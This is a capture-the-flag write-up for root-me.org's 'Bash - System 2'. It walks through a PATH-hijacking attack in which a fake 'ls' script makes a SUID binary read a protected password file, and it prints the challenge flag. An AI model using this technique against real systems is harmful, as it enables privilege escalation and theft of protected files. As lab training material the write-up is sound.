---
title: Bash - System 2 - root-me.org
published: true
---

# [](#intro)Introduction

Since we just solved Bash - System 1 (you can check it out [here](bash-system-1-root-me)), let's go and solve their second level as well. This challenge is very similar to the last one, but with a twist.

# [](#level-description)Challenge description

The 'Statement' for this challenge is the following C code:

```c
    #include <stdlib.h>
    #include <stdio.h>
    #include <unistd.h>
    #include <sys/types.h>
     
    int main(){
        setreuid(geteuid(), geteuid());
        system("ls -lA /challenge/app-script/ch12/.passwd");
        return 0;
    }
```

To connect to the room, we can SSH:

`ssh -p 2222 app-script-ch12@challenge02.root-me.org`

with the password `app-script-ch12`.

# [](#approach)Approach mindset

Let's start building up some calluses again by developing our approach mindset step-by-step. For this problem, we have already tackled the basic concepts in our previous Capture The Flag (CTF) challenge. 

## [](#mindset-step1)Step 1 - Understanding basic concepts

If you are not familiar with the functions `setreuid` and `system`, go check it out in my last CTF solution for Bash - System 1, which we discussed them thoroughly [here](bash-system-1-root-me#step-1---understanding-basic-concepts). 

## [](#mindset-step2)Step 2 - Understanding the problem

We can see that this challenge is fairly similar to Bash - System 1 challenge. However, we have something new here. In the previous CTF, we saw that the `system` line was simply a `ls` command. In this level, the complexity increases with the addition of a switch to `ls` command, as seen in the following line of code:

`system("ls -lA /challenge/app-script/ch12/.passwd");`

Note that we have the `-lA` switch passed as argument to the `ls` command. Let's SSH into the machine and take a look around:

```bash
app-script-ch12@challenge02:~$ ls -la
total 32
dr-xr-x---  2 app-script-ch12-cracked app-script-ch12         4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root                    4096 Sep  5 14:00 ..
-r--------  1 root                    root                     640 Dec 10  2021 ._perms
-rw-r-----  1 root                    root                      43 Dec 10  2021 .git
-r--r-----  1 app-script-ch12-cracked app-script-ch12-cracked   14 Dec 10  2021 .passwd
-rwsr-x---  1 app-script-ch12-cracked app-script-ch12         7252 Dec 10  2021 ch12
-r--r-----  1 app-script-ch12         app-script-ch12          204 Dec 10  2021 ch12.c
```

As we can see, we need to find a way to `cat` the `.passwd` file through the `ch12` binary, which is the compiled version of `ch12.c`. The problem is exactly the same as the previous one in Bash - System 1. The `ch12` SUID bit is set, meaning the `system` function, alongside with the `setreuid`, will make sure the script runs the command as `app-script-ch12-cracked`, granting the right permissions we need to read `.passwd`.

We could think of a way to trick the program into thinking it ran the `ls` command, but actully runs the `cat` command. However, the switch `-lA` will make this unbearable. The thing is that the `cat` command does not have these two switches used here.

Well, we already know how to make the program runs a crafted `ls` command. We just need to find a way to make it ignore the switch. That's our goal!

## [](#mindset-step3)Step 3 - Crafting the attack

We shall start solving this challenge by doing exactly what we have done in Bash - System 1:

1. First, we go to the `/tmp` directory and make a new directory. Then, `cd` into it:

```bash
app-script-ch12@challenge02:~$ mkdir /tmp/cecil
app-script-ch12@challenge02:~$ cd /tmp/cecil
app-script-ch12@challenge02:/tmp/cecil$ 
```

2. Now, we export this path to our $PATH variable with the following command:

```bash
app-script-ch12@challenge02:/tmp/cecil$ export PATH=/tmp/cecil:$PATH
app-script-ch12@challenge02:/tmp/cecil$ echo $PATH
/tmp/cecil:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
```

This part is already done. The new $PATH variable includes our new path as first, meaning that any script will prioritize it when looking for commands to run. Now it comes the tricky part. 

To make a point, let's try to solve this (erroneously) with the same approach used in Bash - System 1. We copied the `/bin/cat` binary into `/tmp/cecil` with the name of `ls`. After that, we run the `ch12` binary to read the contents of `.passwd`:

```bash
app-script-ch12@challenge02:/tmp/cecil$ cp /bin/cat ls
app-script-ch12@challenge02:/tmp/cecil$ cd -
/challenge/app-script/ch12
app-script-ch12@challenge02:~$ ./ch12
ls: invalid option -- 'l'
Try 'ls --help' for more information.
```

As we can see, this does not work, and the reason is exactly because of the switch `-lA`. It would have worked if we did not have these switches.

### Abusing `chmod` command

One way I thought to circumvent this is by writing a bash script named `ls` that contained a command to read `.passwd`. But to do so, we need access to `chmod`. We can test this in our `/tmp/cecil` directory by creating a bash script called `test` and making it an executable with `chmod +x test`. For our `test` script, we wrote it with vim:

```bash
#!/bin/bash
echo "hi mom"
```

Followed by:

```bash
app-script-ch12@challenge02:/tmp/cecil$ chmod +x test
app-script-ch12@challenge02:/tmp/cecil$ ./test
hi mom
```

As we can see, we can use `chmod` to create bash executable scripts. Since we are inside a directory included in the path variable, we could craft an `ls` bash script with a cat command inside of it:

```bash
#!/bin/bash
cat
```

and then:

```bash
app-script-ch12@challenge02:/tmp/cecil$ chmod +x ls
```

## [](#mindset-step4)Step 4 - Solving!

Ok. We have a bash script that mimics the `cat` command disguised as `ls`. Let's try it out. 

### Attempt 1

If we try to run the `ch12` binary under these circumstances, this is what happens:

```bash
app-script-ch12@challenge02:~$ ./ch12

```

Nothing. Why?! Here's what is happening: the `./ch12` is looking for the binary called `ls`, which in this case is a bash script that runs an empty `cat` command. But what happens with the rest of the string in the `system` function, you ask? Well, they are treated as command line arguments to our bash script!

To test this hypothesis, let's change our `ls` bash script to the following:

```bash
#!/bin/bash
echo "False command: $0"
echo "Arguments: $@"
```

Now, when our `ls` command runs, it will print out its path and the arguments passed after it. If our hypothesis is correct, when we run `ch12` now, it should print the rest of the string as the arguments:

```bash
app-script-ch12@challenge02:~$ ./ch12
False command: /tmp/cecil/ls
Arguments: -lA /challenge/app-script/ch12/.passwd
```

Amazing! It is in the mistakes that we craft a solution!

### Attempt 2

Since we got rid of the `-lA` flag by making it to be passed as arguments of our fake `ls` script, we can change the `ls` bash script to simply `cat /challenge/app-script/ch12/.passwd`:

```bash
#!/bin/bash
cat /challenge/app-script/ch12/.passwd
```

Now, we run the `ch12` binary again:

```bash
app-script-ch12@challenge02:~$ ./ch12
8a95eDS/*e_T#
```

And we get the flag!

# [](#conclusions)Conclusion

In this CTF, we dove into another layer of system complexities and the exploitation of C functions. We began by dissecting the core elements presented by the challenge script, progressing towards identifying potential exploitation avenues.

The strategy was built around the concept of command substitution, made possible by the writable `/tmp` directory and by manipulating the $PATH variable. This allowed us to craft a substitute `ls` command that redirected the execution flow from the intended `ls -lA` command to our bash script. By creating a bash script, the `ls` command was treated as a executable and the rest of the string as arguments, eliminating the `-lA` switch.

This was all possible due to the fact we had already tackled a similar problem, and because we tried a failed attempt first. Remember, it is in the failures that we find the solution!

Thanks for sticking 'til the end. I hope you learned something new today! And remember, always do your **research!**

<a href="/">Go back</a>






